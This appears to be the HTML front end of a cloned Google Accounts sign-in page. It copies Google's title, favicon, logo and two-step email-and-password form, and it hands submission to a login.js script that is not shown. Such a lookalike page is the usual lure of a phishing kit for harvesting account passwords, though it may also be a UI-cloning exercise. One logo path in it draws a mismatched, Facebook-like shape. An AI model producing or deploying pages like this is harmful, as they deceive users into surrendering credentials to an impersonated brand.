<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="stylesheet" href="login.css">
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;600&display=swap" rel="stylesheet">
    <link rel="icon" href="https://accounts.google.com/favicon.ico">
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <div class="header-content">
                <div class="language-selector">
                    <select id="languageSelect">
                        <option value="en">English (United States)</option>
                        <option value="es">Español</option>
                        <option value="fr">Français</option>
                        <option value="de">Deutsch</option>
                        <option value="it">Italiano</option>
                        <option value="pt">Português</option>
                        <option value="ru">Русский</option>
                        <option value="ja">日本語</option>
                        <option value="ko">한국어</option>
                        <option value="zh">中文</option>
                    </select>
                </div>
            </div>
        </header>

        <!-- Main Content -->
        <main class="main-content">
            <div class="login-card">
                <div class="logo-container">
                    <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="google-logo">
                        <g id="qaEJec">
                            <path fill="#ea4335" d="m12 .02c-5.5-.05-9.92 4.23-9.99 9.73-.07 5.05 3.7 9.42 8.64 10.17v-7.2h-2.58v-2.91h2.58v-2.22c0-2.54 1.49-3.94 3.8-3.94 1.11 0 2.26.2 2.26.2v2.48h-1.27c-1.25 0-1.64.78-1.64 1.58v1.9h2.78l-.45 2.91h-2.33v7.2c4.94-.75 8.71-5.12 8.64-10.17-.07-5.5-4.49-9.78-9.99-9.73z"/>
                            <path fill="#34a853" d="m21 12.2c0-.79-.07-1.54-.2-2.28h-9.8v4.34h5.6c-.24 1.29-.98 2.39-2.1 3.12v2.59h3.4c1.99-1.83 3.1-4.52 3.1-7.77z"/>
                            <path fill="#fbbc05" d="m12 24c2.83 0 5.21-.93 6.96-2.53l-3.4-2.59c-.94.63-2.14 1.01-3.56 1.01-2.74 0-5.06-1.85-5.89-4.34h-3.51v2.71c1.75 3.48 5.36 5.74 9.4 5.74z"/>
                            <path fill="#ea4335" d="m6.11 14.55c-.21-.63-.33-1.31-.33-2.05s.12-1.42.33-2.05v-2.71h-3.51c-.72 1.43-1.13 3.06-1.13 4.76s.41 3.33 1.13 4.76l3.51-2.71z"/>
                            <path fill="#34a853" d="m12 4.75c1.55 0 2.94.53 4.04 1.58l3.02-3.02c-1.82-1.7-4.2-2.73-7.06-2.73-4.04 0-7.65 2.26-9.4 5.74l3.51 2.71c.83-2.49 3.15-4.34 5.89-4.34z"/>
                        </g>
                    </svg>
                </div>

                <div class="card-header">
                    <h1 class="signin-header">Sign in</h1>
                    <p class="signin-subheader">Use your Google Account</p>
                </div>

                <form class="signin-form" id="signinForm">
                    <div class="input-container">
                        <div class="input-wrapper">
                            <input type="email" id="email" name="email" class="input-field" placeholder=" " required>
                            <label for="email" class="input-label">Email or phone</label>
                        </div>
                        <div class="error-message" id="emailError"></div>
                    </div>

                    <div class="forgot-email">
                        <a href="#" class="forgot-link">Forgot email?</a>
                    </div>

                    <div class="guest-mode">
                        <p class="guest-text">Not your computer? Use Guest mode to sign in privately.</p>
                        <a href="#" class="learn-more">Learn more</a>
                    </div>

                    <div class="form-buttons">
                        <a href="#" class="create-account">Create account</a>
                        <button type="submit" class="next-button" id="nextButton">
                            <span>Next</span>
                        </button>
                    </div>
                </form>
            </div>

            <!-- Password Step (Initially Hidden) -->
            <div class="login-card password-step" id="passwordStep" style="display: none;">
                <div class="logo-container">
                    <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="google-logo">
                        <g id="qaEJec">
                            <path fill="#ea4335" d="m12 .02c-5.5-.05-9.92 4.23-9.99 9.73-.07 5.05 3.7 9.42 8.64 10.17v-7.2h-2.58v-2.91h2.58v-2.22c0-2.54 1.49-3.94 3.8-3.94 1.11 0 2.26.2 2.26.2v2.48h-1.27c-1.25 0-1.64.78-1.64 1.58v1.9h2.78l-.45 2.91h-2.33v7.2c4.94-.75 8.71-5.12 8.64-10.17-.07-5.5-4.49-9.78-9.99-9.73z"/>
                            <path fill="#34a853" d="m21 12.2c0-.79-.07-1.54-.2-2.28h-9.8v4.34h5.6c-.24 1.29-.98 2.39-2.1 3.12v2.59h3.4c1.99-1.83 3.1-4.52 3.1-7.77z"/>
                            <path fill="#fbbc05" d="m12 24c2.83 0 5.21-.93 6.96-2.53l-3.4-2.59c-.94.63-2.14 1.01-3.56 1.01-2.74 0-5.06-1.85-5.89-4.34h-3.51v2.71c1.75 3.48 5.36 5.74 9.4 5.74z"/>
                            <path fill="#ea4335" d="m6.11 14.55c-.21-.63-.33-1.31-.33-2.05s.12-1.42.33-2.05v-2.71h-3.51c-.72 1.43-1.13 3.06-1.13 4.76s.41 3.33 1.13 4.76l3.51-2.71z"/>
                            <path fill="#34a853" d="m12 4.75c1.55 0 2.94.53 4.04 1.58l3.02-3.02c-1.82-1.7-4.2-2.73-7.06-2.73-4.04 0-7.65 2.26-9.4 5.74l3.51 2.71c.83-2.49 3.15-4.34 5.89-4.34z"/>
                        </g>
                    </svg>
                </div>

                <div class="card-header">
                    <h1 class="signin-header">Welcome</h1>
                    <div class="user-info">
                        <div class="user-avatar">
                            <div class="avatar-circle">
                                <span class="avatar-initial" id="userInitial">U</span>
                            </div>
                        </div>
                        <div class="user-email" id="userEmailDisplay">user@gmail.com</div>
                        <a href="#" class="switch-account" id="switchAccount">Switch account</a>
                    </div>
                </div>

                <form class="signin-form" id="passwordForm">
                    <div class="input-container">
                        <div class="input-wrapper">
                            <input type="password" id="password" name="password" class="input-field" placeholder=" " required>
                            <label for="password" class="input-label">Enter your password</label>
                            <button type="button" class="show-password" id="showPassword">
                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="#5f6368"/>
                                </svg>
                            </button>
                        </div>
                        <div class="error-message" id="passwordError"></div>
                    </div>

                    <div class="forgot-password">
                        <a href="#" class="forgot-link">Forgot password?</a>
                    </div>

                    <div class="form-buttons">
                        <button type="button" class="back-button" id="backButton">
                            <span>Back</span>
                        </button>
                        <button type="submit" class="next-button" id="signInButton">
                            <span>Sign in</span>
                        </button>
                    </div>
                </form>
            </div>
        </main>

        <!-- Footer -->
        <footer class="footer">
            <div class="footer-content">
                <div class="footer-links">
                    <a href="#">Privacy</a>
                    <a href="#">Terms</a>
                </div>
                <div class="footer-language">
                    <select class="language-footer">
                        <option value="en">English (United States)</option>
                        <option value="es">Español</option>
                        <option value="fr">Français</option>
                        <option value="de">Deutsch</option>
                        <option value="it">Italiano</option>
                        <option value="pt">Português</option>
                        <option value="ru">Русский</option>
                        <option value="ja">日本語</option>
                        <option value="ko">한국어</option>
                        <option value="zh">中文</option>
                    </select>
                </div>
            </div>
        </footer>
    </div>

    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
    </div>

    <script src="login.js"></script>
</body>
</html>
